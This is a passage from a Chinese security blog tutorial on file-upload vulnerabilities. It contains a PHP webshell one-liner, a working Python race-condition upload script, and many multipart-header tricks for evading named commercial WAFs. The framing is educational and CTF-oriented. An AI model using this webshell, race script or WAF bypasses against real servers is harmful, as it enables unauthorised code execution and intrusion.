<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&quot;./info.php&quot;, &quot;w&quot;), &#x27;&lt;?php @eval($_POST[&quot;drops&quot;]) ?&gt;&#x27;); ?&gt;Copy</span><br></pre></td></tr></table></figure>

<p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RaceCondition</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.url = <span class="string">&quot;http://127.0.0.1:8080/upload/shell0.php&quot;</span></span><br><span class="line">        self.uploadUrl = <span class="string">&quot;http://127.0.0.1:8080/upload/copy.php&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;try to call uploaded file...&#x27;</span>)</span><br><span class="line">        r = requests.get(self.url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*]create file info.php success&quot;</span>)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_upload</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;upload file.....&quot;</span>)</span><br><span class="line">        file = &#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;shell0.php&quot;</span>,<span class="string">&quot;r&quot;</span>)&#125;</span><br><span class="line">        requests.post(self.uploadUrl, files=file)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                self._get()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">                self._upload()</span><br><span class="line">                self._get()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    threads = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads):</span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>



<p>关于这方面在ctf中比较常见，参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/iamsongyu/article/details/83346260?utm_source=app">https://blog.csdn.net/iamsongyu/article/details/83346260?utm_source=app</a></p>
<h2 id="3-cms、编辑器漏洞"><a href="#3-cms、编辑器漏洞" class="headerlink" title="3.cms、编辑器漏洞"></a>3.cms、编辑器漏洞</h2><h3 id="1-CMS漏洞"><a href="#1-CMS漏洞" class="headerlink" title="1.CMS漏洞"></a>1.CMS漏洞</h3><p>针对不同CMS存在的上传漏洞进行绕过，这个体现出前期信息收集的重要性了，得到各种信息后百度谷歌相应的漏洞。</p>
<h3 id="2-编辑器漏洞"><a href="#2-编辑器漏洞" class="headerlink" title="2.编辑器漏洞"></a>2.编辑器漏洞</h3><p>比如FCK，Ewebeditor等，可以针对编辑器的漏洞进行绕过。</p>
<p><img src="image-20210210180736302.png" alt="image-20210210180736302"></p>
<p>还可参考：<a target="_blank" rel="noopener" href="https://navisec.it/%e7%bc%96%e8%be%91%e5%99%a8%e6%bc%8f%e6%b4%9e%e6%89%8b%e5%86%8c/">https://navisec.it/%e7%bc%96%e8%be%91%e5%99%a8%e6%bc%8f%e6%b4%9e%e6%89%8b%e5%86%8c/</a></p>
<h2 id="4-bypassWAF"><a href="#4-bypassWAF" class="headerlink" title="4.bypassWAF"></a>4.bypassWAF</h2><p><strong>前言</strong></p>
<p>一般bypasswaf有四个方面</p>
<ul>
<li>从架构层Bypass WAF 。</li>
<li>从资源限角度bypass WAF。</li>
<li>从协议层面bypass WAF。</li>
<li>从规则缺陷bypass WAF。</li>
</ul>
<p>但是就文件上传来说，本人目前还没有深入到怎样从架构或者资源层面绕过waf，所以本文均从协议、规则层面来绕过waf。有关bypasswaf的具体详情参考：<a target="_blank" rel="noopener" href="https://weibo.com/ttarticle/p/show?id=2309404007261092631700&sudaref=www.google.com.hk&display=0&retcode=6102%EF%BC%8C%E8%BF%99%E6%98%AF%E4%B8%80%E7%AF%87%E9%9D%9E%E5%B8%B8%E4%B8%8D%E9%94%99%E7%9A%84%E6%96%87%E7%AB%A0%E3%80%82">https://weibo.com/ttarticle/p/show?id=2309404007261092631700&amp;sudaref=www.google.com.hk&amp;display=0&amp;retcode=6102，这是一篇非常不错的文章。</a></p>
<p><strong>waf位置</strong></p>
<p><img src="image-20210214204416120.png" alt="image-20210214204416120"></p>
<h3 id="1-waf校验"><a href="#1-waf校验" class="headerlink" title="1.waf校验"></a>1.waf校验</h3><p>上传文件时waf检查文件的位置：</p>
<ol>
<li><p>请求的url</p>
</li>
<li><p>Boundary边界</p>
</li>
<li><p>MIME类型</p>
</li>
<li><p>文件扩展名</p>
</li>
<li><p>文件内容</p>
</li>
</ol>
<h3 id="2-bypasswaf"><a href="#2-bypasswaf" class="headerlink" title="2.bypasswaf"></a>2.bypasswaf</h3><h4 id="1-后缀"><a href="#1-后缀" class="headerlink" title="1.后缀"></a>1.后缀</h4><p>常见的后缀黑名单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">asp|asa|cer|cdx|aspx|ashx|ascx|asax</span><br><span class="line">php|php2|php3|php4|php5|asis|htaccess</span><br><span class="line">htm|html|shtml|pwml|phtml|phtm|js|jsp</span><br><span class="line">vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini</span><br></pre></td></tr></table></figure>

<p>这算是比较全的黑名单了吧，一般来说，不存在黑名单绕过的情况，除非开发人员水的一逼。。。</p>
<p>其实这一部分和<strong>服务端校验后缀差不多</strong>。</p>
<h4 id="2-HTTP数据包"><a href="#2-HTTP数据包" class="headerlink" title="2.HTTP数据包"></a>2.HTTP数据包</h4><p>目前，市面上常见的是解析文件名，少数WAF是解析文件内容，比如长亭。</p>
<h5 id="1-常见waf绕过"><a href="#1-常见waf绕过" class="headerlink" title="1.常见waf绕过"></a>1.常见waf绕过</h5><p><strong>安全狗绕过</strong></p>
<p>1.绕过思路：对文件的数据包进行处理。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关键点在这里Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;ian.php&quot;</span><br><span class="line">将form-data;            修改为~form-data;</span><br></pre></td></tr></table></figure>

<p>2.通过替换大小写来进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">将Content-Disposition    修改为content-Disposition</span><br><span class="line">将 form-data            修改为Form-data</span><br><span class="line">将 Content-Type         修改为content-Type</span><br></pre></td></tr></table></figure>

<p>3.通过删减空格来进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">将Content-Disposition: form-data          冒号后面 增加或减少一个空格</span><br><span class="line">将form-data; name=&quot;file&quot;;                分号后面 增加或减少一个空格</span><br><span class="line">将 Content-Type: application/octet-stream   冒号后面 增加一个空格</span><br></pre></td></tr></table></figure>

<p>4.通过字符串拼接绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">看Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh3.php&quot;</span><br><span class="line">将 form-data 修改为   f+orm-data</span><br><span class="line">将 from-data 修改为   form-d+ata</span><br></pre></td></tr></table></figure>

<p>5.双文件上传绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;https://www.xxx.com/xxx.asp(php)&quot; method=&quot;post&quot;</span><br><span class="line">name=&quot;form1&quot; enctype=&quot;multipart/form‐data&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName1&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName2&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;上传&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>6.HTTP header 属性值绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh.php&quot;</span><br><span class="line">我们通过替换form-data 为*来绕过</span><br><span class="line">Content-Disposition: *; name=&quot;file&quot;; filename=&quot;yjh.php&quot;</span><br></pre></td></tr></table></figure>

<p>7.HTTP header 属性名称绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">源代码:</span><br><span class="line">Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image/png</span><br><span class="line">绕过内容如下：</span><br><span class="line">Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png</span><br><span class="line">C.php&quot;</span><br><span class="line">删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php&quot;.</span><br></pre></td></tr></table></figure>

<p>8.等效替换绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原内容：</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------471463142114</span><br><span class="line">修改后:</span><br><span class="line">Content-Type: multipart/form-data; boundary =---------------------------471463142114</span><br><span class="line">boundary后面加入空格。</span><br></pre></td></tr></table></figure>

<p>9.修改编码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用UTF-16、Unicode、双URL编码等等</span><br></pre></td></tr></table></figure>

<p><strong>WTS-WAF 绕过上传</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原内容：</span><br><span class="line">Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=&quot;xss.php&quot;</span><br><span class="line">添加回车</span><br><span class="line">Content-Disposition: form-data; name=&quot;up_picture&quot;; file</span><br><span class="line">name=&quot;xss.php&quot;</span><br></pre></td></tr></table></figure>

<p><strong>百度云上传绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">百度云绕过就简单的很多很多，在对文件名大小写上面没有检测php是过了的，Php就能过，或者PHP，一句话自己合成图片马用Xise连接即可。</span><br><span class="line">Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=&quot;xss.jpg .Php&quot;</span><br></pre></td></tr></table></figure>

<p><strong>阿里云上传绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">源代码：</span><br><span class="line">Content-Disposition: form-data; name=&quot;img_crop_file&quot;; filename=&quot;1.jpg .Php&quot;Content-Type: image/jpeg</span><br><span class="line">修改如下：</span><br><span class="line">Content-Disposition: form-data; name=&quot;img_crop_file&quot;; filename=&quot;1.php&quot;</span><br><span class="line">没错，将=号这里回车删除掉Content-Type: image/jpeg即可绕过。</span><br></pre></td></tr></table></figure>

<p><strong>360主机上传绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">源代码:</span><br><span class="line">Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image/png</span><br><span class="line">绕过内容如下：</span><br><span class="line">Content- Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png</span><br><span class="line">Content-Disposition 修改为 Content-空格Disposition</span><br></pre></td></tr></table></figure>



<h5 id="2-常规绕过手法"><a href="#2-常规绕过手法" class="headerlink" title="2.常规绕过手法"></a>2.常规绕过手法</h5><p><strong>MIME类型绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上传木马时，提示格式错误。直接抓包修改Content-Type 为正确的格式尝试绕过</span><br></pre></td></tr></table></figure>

<p><strong>CONTENT-LENGTH绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">针对这种类型的验证，我们可以通过上传一些非常短的恶意代码来绕过。上传文件的大小取决于，Web服务器上的最大长度限制。我们可以使用不同大小的文件来fuzzing上传程序，从而计算出它的限制范围。</span><br></pre></td></tr></table></figure>



<p>下面内容，都是基于文件名解析。</p>
<p><strong>垃圾数据填充绕过</strong></p>
<p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。</p>
<ul>
<li>构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验<br><img src="image-20210215001437086.png" alt="image-20210215001437086"></li>
<li>将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验<br><img src="image-20210215001504949.png" alt="image-20210215001504949"></li>
<li>将垃圾数据加到Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</li>
</ul>
<p><strong>多个filename</strong></p>
<p>早期版本安全狗，可以多加一个filename</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.txt&quot;; filename=&quot;test.php&quot;</span><br></pre></td></tr></table></figure>

<p>最终上传成功的文件名是test.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。</p>
<p><strong>交换name和filename的顺序</strong></p>
<p>规定Content-Disposition必须在最前面，所以只能交换name和filename的顺序。有的WAF可能会匹配name在前面，filename在后面，所以下面姿势会导致Bypass。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; filename=&quot;xx.php&quot;; name=file_x</span><br></pre></td></tr></table></figure>

<p><strong>修改引号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=file_x; filename=&quot;xx.php&quot;</span><br><span class="line">Content-Disposition: form-data; name=file_x; filename=xx.php</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=xx.php</span><br><span class="line">Content-Disposition: form-data; name=&#x27;file_x&#x27;; filename=&#x27;xx.php&#x27;</span><br><span class="line">Content-Disposition: form-data; name=file_x; filename=&quot;xx.php&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>单引号、双引号、不要引号，都能上传。</p>
<p><strong>大小写</strong></p>
<p>对这三个固定的字符串进行大小写转换</p>
<ul>
<li>Content-Disposition</li>
<li>name</li>
<li>filename</li>
</ul>
<p><strong>空格</strong></p>
<p>在: ; &#x3D;添加1个或者多个空格。</p>
<p><strong>去掉或修改Content-Disposition值</strong></p>
<p>有的WAF在解析的时候，认为Content-Disposition值一定是form-data，造成绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: name=&#x27;file_x&#x27;; filename=&#x27;xx.php&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>多个boundary</strong></p>
<p>最后上传的文件是test.php而非test.txt，但是取的文件名只取了第一个就会被Bypass。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.txt&quot;</span><br><span class="line">Content-Type: text/javascript</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.php&quot;</span><br><span class="line">Content-Type: text/javascript</span><br></pre></td></tr></table></figure>

<p><strong>多个分号</strong></p>
<p>文件解析时，可能解析不到文件名，导致绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;;;; filename=&quot;test.php&quot;</span><br></pre></td></tr></table></figure>

<p><strong>Header在boundary前添加任意字符</strong></p>
<p>PHP支持，JAVA报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; bypassboundary=----WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br></pre></td></tr></table></figure>

<p>** filename换行**</p>
<p>PHP支持，Java不支持</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; file</span><br><span class="line">name=&quot;test.php&quot;</span><br></pre></td></tr></table></figure>

<p><strong>name和filename添加任意字符串</strong></p>
<p>PHP支持，Java不支持</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: name=&quot;file_x&quot;; bypass waf upload; filename=&quot;test.php&quot;;</span><br></pre></td></tr></table></figure>



<h4 id="3-文件内容"><a href="#3-文件内容" class="headerlink" title="3.文件内容"></a>3.文件内容</h4><p>针对文件内容检测的绕过，一般有两种方式，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.制作图片马</span><br><span class="line">2.文件幻术头绕过</span><br></pre></td></tr></table></figure>

<p>另外呢就是对敏感的函数进行检测，比如exec()、eval()这些函数，对应的解决方法是进行替换或者”变形“</p>
<p><strong>POST&#x2F;GET</strong></p>
<p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。<br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>现在基本上很难遇到能够上传恶意文件的漏洞了，一般是结合cms漏洞和各种cve(我一般是这样的、、、)，因为很难遇到逻辑有问题的代码了，这就体现了前期信息收集的重要性了。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-13">https://xz.aliyun.com/t/2657#toc-13</a></p>
<p><a target="_blank" rel="noopener" href="http://www.libpng.org/pub/png/spec/1.2/PNG-Chunks.html#C.Critical-chunks">http://www.libpng.org/pub/png/spec/1.2/PNG-Chunks.html#C.Critical-chunks</a></p>
<p><a target="_blank" rel="noopener" href="https://secgeek.net/bookfresh-vulnerability/">https://secgeek.net/bookfresh-vulnerability/</a></p>
<p><a target="_blank" rel="noopener" href="https://zhzhdoai.github.io/2019/07/10/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://zhzhdoai.github.io/2019/07/10/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></p>
<p><a target="_blank" rel="noopener" href="https://yinwc.github.io/2020/04/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://yinwc.github.io/2020/04/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/117827.html">https://www.secpulse.com/archives/117827.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164561#h2-1">https://www.anquanke.com/post/id/164561#h2-1</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/153376">https://www.anquanke.com/post/id/153376</a></p>
<p><a target="_blank" rel="noopener" href="https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/">https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/11/04/5dbfacb696546/">https://www.dazhuanlan.com/2019/11/04/5dbfacb696546/</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/lM8XeOpxP1871U_3EVPCDg">https://mp.weixin.qq.com/s/lM8XeOpxP1871U_3EVPCDg</a></p>
<p><a target="_blank" rel="noopener" href="https://choge.top/2020/02/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%AB%98%E7%BA%A7%E5%88%A9%E7%94%A8/">https://choge.top/2020/02/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%AB%98%E7%BA%A7%E5%88%A9%E7%94%A8/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164561">https://www.anquanke.com/post/id/164561</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.hacking8.com/MiscSecNotes/bypass-waf-cookbook.html">https://www.hacking8.com/MiscSecNotes/bypass-waf-cookbook.html</a></p>
<p><a target="_blank" rel="noopener" href="https://weibo.com/ttarticle/p/show?id=2309404007261092631700&sudaref=www.google.com.hk&display=0&retcode=6102">https://weibo.com/ttarticle/p/show?id=2309404007261092631700&amp;sudaref=www.google.com.hk&amp;display=0&amp;retcode=6102</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/10832850.html">https://www.cnblogs.com/-qing-/p/10832850.html</a></p>
<p><a target="_blank" rel="noopener" href="https://huyuanzhi2.github.io/2020/04/02/bypass-waf-upload-jsp/">https://huyuanzhi2.github.io/2020/04/02/bypass-waf-upload-jsp/</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">senu11</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://senu11.github.io">https://senu11.github.io</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">senu11</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/01/04/xss-labs%E8%AE%B0%E5%BD%95/" title="xss-labs记录"><img class="cover" src="/img/1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">xss-labs记录</div></div></a></div><div class="next-post pull-right"><a href="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="upload-labs通关记录"><img class="cover" src="/img/1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">upload-labs通关记录</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A0%A1%E9%AA%8C"><span class="toc-number">1.</span> <span class="toc-text">1.客户端校验</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A0%A1%E9%AA%8C"><span class="toc-number">2.</span> <span class="toc-text">2.服务端校验</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-HTTP-Header%E6%A0%A1%E9%AA%8C"><span class="toc-number">2.1.</span> <span class="toc-text">1.HTTP-Header校验</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-content-type%E6%A0%A1%E9%AA%8C"><span class="toc-number">2.1.1.</span> <span class="toc-text">1.content-type校验</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%A4%A7%E5%86%99-Multipart"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.大写 Multipart</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A0%A1%E9%AA%8C"><span class="toc-number">2.2.</span> <span class="toc-text">2.文件头校验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A0%A1%E9%AA%8C"><span class="toc-number">2.3.</span> <span class="toc-text">3.文件内容校验</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%9B%BF%E6%8D%A2"><span 